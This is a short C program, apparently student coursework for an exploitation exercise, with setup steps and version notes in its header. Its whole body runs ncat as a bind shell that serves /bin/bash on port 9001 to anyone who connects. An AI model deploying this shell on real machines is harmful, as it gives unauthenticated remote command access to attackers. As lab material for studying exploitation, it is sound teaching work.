// Code by Robin Larsson
// rl22ct@student.lnu.se
// robin.larsson@protonmail.ch
// 2019-11-11

// Tested and developed on the following versions.
//
// Ubuntu version:
// root@ubuntu:~# cat /etc/issue
// Ubuntu 18.04.3 LTS \n \l
//
// Kernel version:
// root@ubuntu:~# uname -a
// Linux ubuntu 5.0.0-32-generic #34~18.04.2-Ubuntu SMP Thu Oct 10 10:36:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
//
// Libc version:
// root@ubuntu:~# ldd --version
// ldd (Ubuntu GLIBC 2.27-3ubuntu1) 2.27
//
// GCC version:
// root@ubuntu:~# gcc --version
// gcc (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0

// Compile and setup for exploitation:
// Step 1: Install ncat.
// apt install nmap 
//
// Step 2: Compile the binary.
// Then compile: gcc -o system_ncat system_ncat.c
//
// Step 3: Move the binary to correct location.
// mv system_ncat /usr/local/bin/system_ncat
//
// Step 4: Set execution rights.
// chmod a+x /usr/local/bin/system_ncat

#include<stdlib.h>

int main(){
    system("/usr/bin/ncat -l -p 9001 -e /bin/bash");

    return 0;
}
